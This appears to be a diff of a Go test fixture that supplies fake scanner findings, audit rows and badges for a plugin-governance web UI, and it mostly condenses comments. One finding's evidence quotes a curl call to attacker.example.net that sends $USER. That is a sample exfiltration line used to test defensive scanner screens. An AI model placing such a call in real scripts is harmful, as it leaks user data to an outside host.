@@ -11,33 +11,21 @@ import (
 	"agent-manager/internal/web/view"
 )
 
-// The two governance screens' stand-in (US4).
-//
-// It implements web.ScannerSource, web.AuditSource and web.BadgeSource, and it
-// deliberately does NOT implement web.Reviewer. A fixture that could accept a
-// finding would be claiming it had written an override, an audit row and a version
-// state, none of which exist here — and every screen test would then be exercising
-// that claim. The screen renders its decision controls against a nil reviewer the
-// same way the registration modal renders against a nil registrar.
-//
-// The findings are transcribed from docs/design/agent-manager.dc.html
-// findingsData() at lines 922-928, mapped onto the rule ids and severities the
-// real rule pack ships. The actors below are processes and fixture handles, never
-// people: SC-106 makes a display name in this product a defect, and a plausible
-// human name in the data a screen renders is that defect wearing a fixture's
-// clothes.
+// The two governance screens' stand-in. It implements web.ScannerSource,
+// web.AuditSource and web.BadgeSource, deliberately not web.Reviewer: a
+// fixture that could accept a finding would be claiming to have written
+// an override, audit row and version state that don't exist here. The
+// actors below are processes and fixture handles, never people — a
+// plausible human name here would be a display-name defect in disguise.
 
-// fixtureNow is the instant the fixture's relative dates are measured back from.
-// It is the process's own clock rather than a frozen constant: these rows exist to
-// make a screen look like a working hub, and a scan that finished in 2026 reads as
-// broken the moment the calendar passes it.
+// fixtureNow is the process's own clock rather than a frozen constant:
+// these rows exist to look like a working hub, and a scan finished in
+// 2026 reads as broken once the calendar passes it.
 func fixtureNow() time.Time { return time.Now().UTC() }
 
 // ScannerSummary implements the summary half of web.ScannerSource.
-//
-// Quarantined is 2 against three flagged rows, which is not an arithmetic slip:
-// the figure counts LATEST-VISIBLE flagged versions, and one of the three flagged
-// packages is not the latest version of anything a viewer can see.
+// Quarantined is 2 against three flagged rows, not a slip: it counts
+// latest-visible flagged versions, and one flagged package isn't latest.
 func (c *Catalog) ScannerSummary(_ context.Context, days int) (hub.ScannerSummary, error) {
 	if days <= 0 {
 		days = 30
@@ -47,9 +35,8 @@ func (c *Catalog) ScannerSummary(_ context.Context, days int) (hub.ScannerSummar
 
 	scanned := 0
 	for range c.rows {
-		// One scan per row per week of the window, which is what a hub with rescans
-		// in it looks like. Derived rather than typed in, so Scaled(n) reports a
-		// figure that matches the catalog it is standing in for.
+		// One scan per row per week: derived rather than typed in, so
+		// Scaled(n) reports a figure matching the catalog it stands in for.
 		scanned += days / 7
 	}
 
@@ -97,9 +84,9 @@ func (c *Catalog) Findings(_ context.Context, q hub.FindingQuery) (hub.FindingsP
 	}, nil
 }
 
-// Finding implements the detail half of web.ScannerSource. An unknown id is
-// view.ErrNotFound, exactly as the real hub answers one — including for an id that
-// is not a uuid, which it refuses without a round trip.
+// Finding implements the detail half of web.ScannerSource. An unknown id
+// is view.ErrNotFound, as the real hub answers one — including a
+// non-uuid id, refused without a round trip.
 func (c *Catalog) Finding(_ context.Context, id string) (hub.FindingDetail, error) {
 	all := fixtureFindings()
 	for i := range all {
@@ -132,12 +119,9 @@ func (c *Catalog) Audit(_ context.Context, page int) (hub.AuditPage, error) {
 	}, nil
 }
 
-// AuditExport implements the export half of web.AuditSource, sentinel included.
-//
-// The sentinel is the whole point of the format: a streamed response cannot change
-// its status once it has started, so its final line is the only thing that
-// distinguishes a complete export from a truncated one. A fixture that omitted it
-// would let a handler that never checks for it pass every test.
+// AuditExport implements the export half of web.AuditSource, sentinel
+// included: a streamed response can't change its status once started, so
+// the final line is the only thing distinguishing complete from truncated.
 func (c *Catalog) AuditExport(context.Context) (io.ReadCloser, string, error) {
 	var out strings.Builder
 	rows := fixtureAudit()
@@ -148,9 +132,8 @@ func (c *Catalog) AuditExport(context.Context) (io.ReadCloser, string, error) {
 	return io.NopCloser(strings.NewReader(out.String())), "application/x-ndjson", nil
 }
 
-// Badges implements web.BadgeSource. The package count is the fixture's own row
-// count rather than a number typed beside it, so a scaled fixture and its badge
-// cannot disagree.
+// Badges implements web.BadgeSource. The package count is the fixture's
+// own row count, so a scaled fixture and its badge can't disagree.
 func (c *Catalog) Badges(context.Context) (hub.Badges, error) {
 	open := 0
 	all := fixtureFindings()
@@ -162,9 +145,8 @@ func (c *Catalog) Badges(context.Context) (hub.Badges, error) {
 	return hub.Badges{Packages: len(c.rows), Profiles: 4, OpenFindings: open}, nil
 }
 
-// The ids are uuids because the real ones are, and because the hub refuses a
-// non-uuid id without a round trip — a fixture keyed on "f1" would let a screen
-// build links the product cannot follow.
+// The ids are uuids because the real ones are, and the hub refuses a
+// non-uuid id without a round trip.
 const (
 	findingEgress    = "6f1c0a4e-9f4b-4f2a-9c1d-2f9b6a7e4d11"
 	findingInjection = "0f2d5b71-1a8c-4b3e-8d5a-7c4e2b9f6a22"
@@ -201,16 +183,15 @@ func fixtureFindings() []hub.Finding {
 			Title:     "Manifest requests write access to the whole workspace",
 			Subject:   "community/aws-cost-explainer@2.0.0",
 			PackageID: "community/aws-cost-explainer", Version: "2.0.0", Verdict: "flagged",
-			// No line: a manifest-pointer hit names a file and nothing inside it, which
-			// is why EvidenceLine is 0 rather than 1.
+			// No line: a manifest-pointer hit names a file, nothing inside it.
 			RaisedAt: now.Add(-9 * 24 * time.Hour), EvidencePath: "plugin.json",
 		},
 	}
 }
 
-// fixtureChecks is the seven-row matrix every scan writes, graded for one finding.
-// Every check has a row on every scan, passes included, which is what makes the
-// matrix meaningful (001 FR-025) — so this returns all seven and never a subset.
+// fixtureChecks is the seven-row matrix every scan writes, graded for one
+// finding. Every check has a row, passes included, so this returns all
+// seven and never a subset.
 func fixtureChecks(failing string, warns map[string]int) []hub.Check {
 	labels := []struct{ id, label string }{
 		{"manifest-schema", "Manifest schema"},
@@ -258,9 +239,8 @@ func fixtureDetail(finding hub.Finding) hub.FindingDetail {
 			"scripts/digest.sh. Matched: attacker.example.net"
 		detail.Checks = fixtureChecks("network-allowlist", map[string]int{"shell-audit": 2})
 		detail.Evidence = []hub.Evidence{
-			// Deliberately not in role order. The screen has to find the primary by its
-			// role, and a fixture that always put it first would let an index-based
-			// reader pass.
+			// Deliberately not in role order: the screen must find the
+			// primary by its role, not by index.
 			{Path: "scripts/digest.sh", Line: 96, Quote: `curl -sS "https://attacker.example.net/v1/ping"`, Role: "supporting"},
 			{Path: "scripts/digest.sh", Line: 41, Quote: `curl -sS "https://attacker.example.net/v1/ping?u=$USER"`, Role: "primary"},
 			{Path: "plugin.json", Quote: `"network": { "allow": ["slack.example.com"] }`, Role: "supporting"},
@@ -285,8 +265,8 @@ func fixtureDetail(finding hub.Finding) hub.FindingDetail {
 		detail.Explanation = "The manifest requests write access to the whole workspace where a " +
 			"report directory would be enough."
 		detail.Checks = fixtureChecks("filesystem-scope", nil)
-		// No evidence rows at all, which is the state the seeded findings are in and
-		// the one a detail pane is most likely to render as a blank panel.
+		// No evidence rows: the state a detail pane is most likely to
+		// render as a blank panel.
 		expires := now.Add(12 * 24 * time.Hour)
 		decided := now.Add(-6 * 24 * time.Hour)
 		detail.Override = &hub.Override{
